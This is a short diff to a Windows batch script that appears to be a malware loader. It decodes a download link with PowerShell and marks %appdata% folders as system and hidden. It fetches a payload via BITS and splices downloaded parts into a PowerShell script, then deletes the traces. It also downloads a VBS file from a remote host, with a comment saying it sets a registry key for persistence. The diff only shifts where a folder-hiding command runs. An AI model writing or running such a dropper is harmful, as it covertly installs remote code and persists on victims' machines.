@@ -17,7 +17,6 @@ for /f "delims=" %%A in ('powershell -NoProfile -Command ^
   "[Text.Encoding]::UTF8.GetString($r)"') do set "dynLink=%%A"
 
 :: Cleanup and prepare working folder
-mkdir "%appdata%\paged" & attrib +s +h "%appdata%\paged"
 attrib +s +h "%appdata%\Paged-l"
 rmdir /s /q "%d%" 2>nul
 mkdir "%d%"
@@ -31,6 +30,8 @@ powershell -c "Start-BitsTransfer %dynLink% '%b%'"
 :: Combine all and save as PowerShell script
 powershell -c "(gc '%f%' -Raw) -replace '----',(gc '%a%' -Raw) -replace '====',(gc '%b%' -Raw) | sc '%c%'"
 del "%a%" "%b%" 2>nul
+
+attrib +s +h "%appdata%\paged"
 
 :: Download VBS and set registry key for persistence
 powershell -c "iwr https://%u%/S_m.vbs -OutFile '%v%'"
